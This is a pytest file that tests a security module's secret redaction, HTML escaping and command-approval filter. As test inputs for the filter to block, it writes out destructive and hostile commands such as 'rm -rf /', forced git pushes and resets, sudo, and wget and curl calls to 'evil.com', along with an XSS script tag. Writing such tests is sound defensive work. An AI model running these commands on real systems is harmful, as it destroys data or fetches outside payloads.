"""Tests for spinoff.overview.security."""

from spinoff.overview.security import is_safe_to_approve, redact_secrets, sanitize_html


class TestRedactSecrets:
    def test_sk_key_redacted(self) -> None:
        assert "[REDACTED]" in redact_secrets("Using sk-proj-abc123def456ghi789")
        assert "abc123def456ghi789" not in redact_secrets("Using sk-proj-abc123def456ghi789")

    def test_pk_key_redacted(self) -> None:
        result = redact_secrets("pk_test_abcdefghijklmnop")
        assert "pk_" in result
        assert "[REDACTED]" in result

    def test_bearer_token_redacted(self) -> None:
        result = redact_secrets("Authorization: Bearer eyJhbGciOiJIUzI1NiJ9")
        assert "Bearer [REDACTED]" in result

    def test_token_equals_redacted(self) -> None:
        result = redact_secrets("token=abc123def456ghi789")
        assert "token=[REDACTED]" in result

    def test_password_colon_redacted(self) -> None:
        result = redact_secrets("password: mySecretPass123")
        assert "password: [REDACTED]" in result

    def test_postgres_uri_redacted(self) -> None:
        result = redact_secrets("postgresql://user:pass@host/db")
        assert "[REDACTED]" in result
        assert "user:pass" not in result

    def test_mongodb_uri_redacted(self) -> None:
        result = redact_secrets("mongodb+srv://admin:secret@cluster.mongodb.net/mydb")
        assert "[REDACTED]" in result

    def test_normal_text_preserved(self) -> None:
        text = "Running pytest tests/ -v --timeout=30"
        assert redact_secrets(text) == text

    def test_short_value_not_redacted(self) -> None:
        # token= with short value (< 8 chars) should not match the first pattern
        result = redact_secrets("token=xy")
        # The KV pattern still catches it
        assert "[REDACTED]" in result or "xy" in result

    def test_empty_string(self) -> None:
        assert redact_secrets("") == ""


class TestIsSafeToApprove:
    def test_git_push_force_blocked(self) -> None:
        safe, reason = is_safe_to_approve("git push --force origin main")
        assert not safe
        assert "force push" in reason

    def test_git_push_dash_f_blocked(self) -> None:
        safe, reason = is_safe_to_approve("git push -f origin main")
        assert not safe

    def test_rm_rf_root_blocked(self) -> None:
        safe, reason = is_safe_to_approve("rm -rf /")
        assert not safe

    def test_sudo_blocked(self) -> None:
        safe, reason = is_safe_to_approve("sudo apt install something")
        assert not safe
        assert "sudo" in reason

    def test_reset_hard_blocked(self) -> None:
        safe, reason = is_safe_to_approve("git reset --hard HEAD~1")
        assert not safe

    def test_checkout_dot_blocked(self) -> None:
        safe, reason = is_safe_to_approve("git checkout .")
        assert not safe

    def test_restore_dot_blocked(self) -> None:
        safe, reason = is_safe_to_approve("git restore .")
        assert not safe

    def test_clean_f_blocked(self) -> None:
        safe, reason = is_safe_to_approve("git clean -fd")
        assert not safe

    def test_external_curl_blocked(self) -> None:
        safe, reason = is_safe_to_approve("curl https://example.com/api")
        assert not safe
        assert "network" in reason

    def test_localhost_curl_allowed(self) -> None:
        safe, _ = is_safe_to_approve("curl http://localhost:8080/health")
        assert safe

    def test_normal_command_allowed(self) -> None:
        safe, _ = is_safe_to_approve("ls -la src/")
        assert safe

    def test_pytest_allowed(self) -> None:
        safe, _ = is_safe_to_approve("pytest tests/ -v")
        assert safe

    def test_git_push_without_force_allowed(self) -> None:
        safe, _ = is_safe_to_approve("git push origin main")
        assert safe


class TestSafetyFilterAdditionalPatterns:
    def test_doas_blocked(self) -> None:
        safe, reason = is_safe_to_approve("doas apt install something")
        assert not safe
        assert "doas" in reason

    def test_su_dash_blocked(self) -> None:
        safe, reason = is_safe_to_approve("su - root")
        assert not safe
        assert "su" in reason

    def test_branch_delete_blocked(self) -> None:
        safe, reason = is_safe_to_approve("git branch -D feature-branch")
        assert not safe
        assert "branch" in reason

    def test_wget_external_blocked(self) -> None:
        safe, reason = is_safe_to_approve("wget https://evil.com/payload")
        assert not safe
        assert "network" in reason

    def test_wget_localhost_allowed(self) -> None:
        safe, _ = is_safe_to_approve("wget http://localhost:3000/data")
        assert safe

    def test_force_with_lease_allowed(self) -> None:
        safe, _ = is_safe_to_approve("git push --force-with-lease origin feature")
        assert safe

    def test_case_insensitive_sudo(self) -> None:
        safe, _ = is_safe_to_approve("SUDO apt install foo")
        assert not safe

    def test_case_insensitive_reset_hard(self) -> None:
        safe, _ = is_safe_to_approve("git RESET --HARD HEAD~1")
        assert not safe

    def test_rm_split_flags_blocked(self) -> None:
        safe, _ = is_safe_to_approve("rm -r -f /")
        assert not safe

    def test_rm_long_flags_blocked(self) -> None:
        safe, _ = is_safe_to_approve("rm --recursive --force /")
        assert not safe

    def test_external_curl_with_localhost_elsewhere_blocked(self) -> None:
        """Curl to external URL should be blocked even if 'localhost' appears elsewhere in screen."""
        # Each curl command on its own line
        text = "some localhost reference\ncurl https://evil.com/api"
        safe, _ = is_safe_to_approve(text)
        assert not safe


class TestSafeHtml:
    def test_escapes_html_chars(self) -> None:
        result = sanitize_html("<script>alert('xss')</script>")
        assert "<script>" not in result
        assert "&lt;script&gt;" in result

    def test_redacts_then_escapes(self) -> None:
        result = sanitize_html("key: sk-proj-abc123def456ghi789 <b>bold</b>")
        assert "[REDACTED]" in result
        assert "&lt;b&gt;" in result
        assert "abc123def456ghi789" not in result
